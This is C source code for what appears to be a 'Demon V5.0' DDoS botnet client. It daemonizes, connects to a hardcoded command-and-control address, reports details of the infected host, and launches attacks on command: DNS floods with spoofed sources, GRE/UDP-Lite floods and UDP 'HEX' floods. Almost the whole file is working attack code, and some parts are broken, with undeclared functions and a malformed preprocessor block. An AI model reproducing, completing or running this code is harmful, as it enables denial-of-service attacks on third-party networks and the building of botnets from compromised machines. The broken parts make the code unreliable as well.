#define PR_SET_NAME 15 //DOESNT REP SKIDZ
#define SERVER_LIST_SIZE (sizeof(Demonserv) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define STD2_SIZE 55
#define BUFFER_SIZE 512


#define PAYLOAD_SIZE 64
#define PROTO_GRE 47
#define PROTO_UDPLITE 136
#define GRE_PROTO_IP 0x0800
 
#define UDP_HDRLEN 8
#define IP_MAXPACKET 65535
#define UID_PATH "/etc/.uid"
#define XOR_KEY "demonkey"
#define IP4_HDRLEN 20
#define ICMP_HDRLEN 8

#include <uuid/uuid.h>
#include <netinet/ip_icmp.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

//////////////////////////////////
#define SERVER_LIST_SIZE (sizeof(Demonserv) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define OPT_SGA   3
#define BUFFER_SIZE 512
/////////////////////////////////////////
unsigned char *Demonserv[] = {"1.1.1.1:666"};
/////////////////////////////////////////
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int Demonicsock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
unsigned char macAddress[6] = {0};
////////////////////////////////////////
struct grehdr {
    uint16_t flags;
    uint16_t protocol;
};

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad); // this to
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(Demonicsock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}
int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}
uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
int build_dns_query(uint8_t *buf, const char *hostname) {
    struct DNS_HEADER {
        uint16_t id;
        uint16_t flags;
        uint16_t qdcount;
        uint16_t ancount;
        uint16_t nscount;
        uint16_t arcount;
    };
 
    struct QUESTION {
        uint16_t qtype;
        uint16_t qclass;
    };
 
    struct DNS_HEADER *dns = (struct DNS_HEADER *)buf;
    dns->id = htons(rand() % 65536);
    dns->flags = htons(0x0100);  // standard recursive query
    dns->qdcount = htons(1);
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = 0;
 
    uint8_t *qname = buf + sizeof(struct DNS_HEADER);
    const char delim[2] = ".";
    char hostname_copy[256];
    strncpy(hostname_copy, hostname, 255);
    hostname_copy[255] = '\0';
 
    char *token = strtok(hostname_copy, delim);
    while (token) {
        size_t len = strlen(token);
        *qname++ = len;
        memcpy(qname, token, len);
        qname += len;
        token = strtok(NULL, delim);
    }
    *qname++ = 0;  // End of QNAME
 
    struct QUESTION *qinfo = (struct QUESTION *)qname;
    qinfo->qtype = htons(33);     // A record
    qinfo->qclass = htons(1);    // IN class
 
    return (qname - buf) + sizeof(struct QUESTION);
}

// DNS sender with spoofed source IP
void sendDNS(char *ip, int secs) {
    int sockfd;
    struct sockaddr_in sin;
    uint8_t packet[IP_MAXPACKET];
    time_t start = time(NULL);
    const int on = 1;
 
    srand(time(NULL));
 
    struct hostent *hp = gethostbyname(ip);
    if (!hp) {
        fprintf(stderr, "Could not resolve hostname %s\n", ip);
        return;
    }
 
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("socket");
        return;
    }
 
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt");
        close(sockfd);
        return;
    }
 
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
 
    while (time(NULL) < start + secs) {
        struct ip *iph = (struct ip *)packet;
        struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ip));
        uint8_t *dns_payload = packet + sizeof(struct ip) + sizeof(struct udphdr);
 
        int dns_len = build_dns_query(dns_payload, "example.com");
 
        char spoofed_ip[16];
        random_ip(spoofed_ip);
 
        iph->ip_hl = 5;
        iph->ip_v = 4;
        iph->ip_tos = 0;
        iph->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + dns_len);
        iph->ip_id = rand();
        iph->ip_off = 0;
        iph->ip_ttl = 64;
        iph->ip_p = IPPROTO_UDP;
        iph->ip_sum = 0;
        iph->ip_src.s_addr = inet_addr(spoofed_ip);
        iph->ip_dst = sin.sin_addr;
        iph->ip_sum = checksum((uint16_t *)iph, sizeof(struct ip));
 
        udph->source = htons(rand() % 65535);
        udph->dest = htons(53);  // DNS port
        udph->len = htons(sizeof(struct udphdr) + dns_len);
        udph->check = 0;  // skipping UDP checksum for now
 
        ssize_t sent = sendto(sockfd, packet, sizeof(struct ip) + sizeof(struct udphdr) + dns_len, 0,
                              (struct sockaddr *)&sin, sizeof(sin));
        if (sent < 0) {
            perror("sendto");
            break;
        }
 
        usleep((rand() % 91 + 1) * 1000);  // delay: 10–100 ms
    }
 
    close(sockfd);
}
 
void sendSTD(unsigned char *ip, int port, int secs) {
    int sock;
    struct sockaddr_in sin;
    time_t start = time(NULL);
    char packet[1500];
 
    struct iphdr *outer_iph = (struct iphdr *)packet;
    struct grehdr *gre = (struct grehdr *)(packet + sizeof(struct iphdr));
    struct iphdr *inner_iph = (struct iphdr *)(packet + sizeof(struct iphdr) + sizeof(struct grehdr));
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr));
    char *data = (char *)(udph + 1);
 
    memset(packet, 0, sizeof(packet));
 
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return;
    }
 
    int on = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt");
        close(sock);
        return;
    }
 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(ip);
 
    while (time(NULL) < start + secs) {
        uint32_t spoofed_ip = rand_ip();
 
        // Outer IP header (GRE tunnel)
        outer_iph->ihl = 5;
        outer_iph->version = 4;
        outer_iph->tos = 0;
        outer_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) +
                                   sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE);
        outer_iph->id = htons(rand() % 65535);
        outer_iph->frag_off = 0;
        outer_iph->ttl = 64;
        outer_iph->protocol = PROTO_GRE;
        outer_iph->saddr = spoofed_ip;
        outer_iph->daddr = sin.sin_addr.s_addr;
        outer_iph->check = 0;
        outer_iph->check = checksum((unsigned short *)outer_iph, sizeof(struct iphdr));
 
        // GRE header
        gre->flags = 0;
        gre->protocol = htons(GRE_PROTO_IP); // Inner payload = IPv4
 
        // Inner IP header (encapsulated)
        inner_iph->ihl = 5;
        inner_iph->version = 4;
        inner_iph->tos = 0;
        inner_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE);
        inner_iph->id = htons(rand() % 65535);
        inner_iph->frag_off = 0;
        inner_iph->ttl = 64;
        inner_iph->protocol = PROTO_UDPLITE;
        inner_iph->saddr = spoofed_ip;
        inner_iph->daddr = sin.sin_addr.s_addr;
        inner_iph->check = 0;
        inner_iph->check = checksum((unsigned short *)inner_iph, sizeof(struct iphdr));
 
        // UDP-Lite header
        udph->source = htons(rand() % 65535);
        udph->dest = htons(port);
        udph->len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
        udph->check = 0;
 
        // Chargen-style payload
        int i;
        for (i = 0; i < PAYLOAD_SIZE; i++) {
    data[i] = 33 + (i % 93); // ASCII 33–126
}
 
 
        sendto(sock, packet,
               sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE,
               0, (struct sockaddr *)&sin, sizeof(sin));
 
        usleep((rand() % 50 + 5) * 1000);
    }
 
    close(sock);
}
void astd(unsigned char *ip, int port, int secs, int packetsize) 
{
        int std_hex;
        std_hex = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char*) &sin,sizeof(sin));
        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while(1)
        {         //change it if u want
                char *hexstring[] = {"\x53\x65\x6c\x66\x20\x52\x65\x70\x20\x46\x75\x63\x6b\x69\x6e\x67\x20\x4e\x65\x54\x69\x53\x20\x61\x6e\x64\x20\x54\x68\x69\x73\x69\x74\x79\x20\x30\x6e\x20\x55\x72\x20\x46\x75\x43\x6b\x49\x6e\x47\x20\x46\x6f\x52\x65\x48\x65\x41\x64\x20\x57\x65\x20\x42\x69\x47\x20\x4c\x33\x33\x54\x20\x48\x61\x78\x45\x72\x53\x0a"};
                if (a >= 50)
                {
                        send(std_hex, hexstring, packetsize, 0);
                        connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(std_hex);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}
char *defarchs() {
    #if defined(__x86_64__) || defined(__amd64__) || defined(__amd64) || defined(__x86_64) || defined(_M_X64) || defined(_M_AMD64)
    return "x86_64";
    #elif defined(__X86__) || defined(_X86_) || defined(i386) || defined(__i386__) || defined(__i386) || defined(__i686__) || defined(__i586__) || defined(__i486__)
    return "x86_32";
    #elif defined(__aarch64__) 
    return "64";
    #elif defined (__ARM_ARCH_5__) || defined(__ARM_ARCH_5E__) || defined(__ARM_ARCH_5T__) || defined(__ARM_ARCH_5TE__) || defined(__ARM_ARCH_5TEJ__)
    return "ARM5";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "ARM4";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__ARM_ARCH_6M_) || defined(__ARM_ARCH_6T2__)
    return "ARM6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__) 
    return "ARM7";
    #elif defined(__BIG_ENDIAN__) || defined(__MIPSEB) || defined(__MIPSEB__) || defined(__MIPS__)
    return "MIPS";
    #elif defined(__LITTLE_ENDIAN__) || defined(_MIPSEL) || defined(__MIPSEL) || defined(__MIPSEL__)
    return "MIPSEL";
    #elif defined(__sh__) || defined(__sh1__) || defined(__sh2__) || defined(__sh3__) || defined(__SH3__) || defined(__SH4__) || defined(__SH5__)
    return "SH4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(_M_PPC) || defined(_ARCH_PPC) || defined(_ARCH_PPC64) || defined(__ppc)
    return "PPC";
    #elif defined(__sparc__) || defined(__sparc) 
    return "SPARC";
    #elif defined(__m68k__) || defined(__MC68K__)
    return "M68k";
    #else
    return "Unknown";
    #endif
}
char *defopsys() {
    #if defined(__gnu_linux__) || defined(__linux__) || defined(linux) || defined(__linux)
    return "Linux";
    #elif defined(__WINDOWS__)
    return "Windows";
    #elif defined(__gnu_linux__) || defined(__linux__) || defined(linux) || defined(__linux) || defined(__ANDROID__)
    return "Android"
	else
    return "Unknown";
    #endif
}	
char *defpkgs()
{
        if(access("/usr/bin/apt-get", F_OK) != -1){
        return "Ubuntu";
        }
        if(access("/usr/lib/portage", F_OK) != -1){
        return "Gentoo";
        }
        if(access("/usr/bin/yum", F_OK) != -1){
        return "CentOS";
        }
		if(access("/usr/share/YaST2", F_OK) != -1){
        return "OpenSUSE";
        }
		if(access("/usr/local/etc/pkg", F_OK) != -1){
		return "FreeBSD";
		}
		if(access("/etc/dropbear/", F_OK) != -1){
        return "Dropbear";
        }
        if(access("/etc/opkg", F_OK) != -1){
        return "OpenWRT";
        }
		else {
        return "Unknown Distro";
        }
}
void cncinput(int argc, unsigned char * argv[]) {
     	if(!strcmp(argv[0], "DNS"))
		{
			if(argc < 3 || atoi(argv[2]) < 1 )
            {
                        sockprintf(mainCommSock, "STD <target> <port> <time>");
                        return;
            }
			
			unsigned char *ip = argv[1];
            int time = atoi(argv[2]);
			
			if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendDNS(hi, time);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendDNS(ip, time);
                        _exit(0);
                }
			
		}

if(!strcmp(argv[0], "STD"))
		{
			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
            {
                        sockprintf(mainCommSock, "STD <target> <port> <time>");
                        return;
            }
			
			unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
			
			if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendSTD(hi, port, time);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendSTD(ip, port, time);
                        _exit(0);
                }
			
		}


  
  
	if(!strcmp(argv[0], "HEX"))
	{
		if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1)
		{
			return;
		}
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		int packetsize = atoi(argv[4]);
		if(strstr(ip, ",") != NULL)
		{
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL)
			{
				if(!listFork())
				{
					astd(hi, port, time, packetsize);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} else {
			if (listFork()) { return; }
			astd(ip, port, time, packetsize);
			_exit(0);
		}
    }
    if(!strcmp(argv[0], "STOP"))
    {
        int killed = 0;
        unsigned long i;
        for (i = 0; i < numpids; i++) {
            if (pids[i] != 0 && pids[i] != getpid()) {
                kill(pids[i], 9);
                killed++;
            }
        }

        if(killed > 0)
        {
        } else {
        }

}}
int initConnection()
{
        unsigned char server[512];
        memset(server, 0, 512);
        if(Demonicsock) { close(Demonicsock); Demonicsock = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, Demonserv[currentServer]);
        int port = 6982;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        Demonicsock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(Demonicsock, server, port, 30)) return 1;

        return 0;
}

int main(int argc, unsigned char *argv[])
{
        if(SERVER_LIST_SIZE <= 0) return 0;

        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        getOurIP();
        pid_t pid1;
        pid_t pid2;
        int status;

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
        setsid();
        chdir("/");
        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }
                sockprintf(Demonicsock, "\x1b[1;31mDemon\x1b[1;37m[\x1b[1;31mV5.0\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\x1b[1;31m-->\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]", inet_ntoa(ourIP), defarchs(), defopsys(), defpkgs());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(Demonicsock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);
                        
                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                cncinput(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }

        return 0;
}
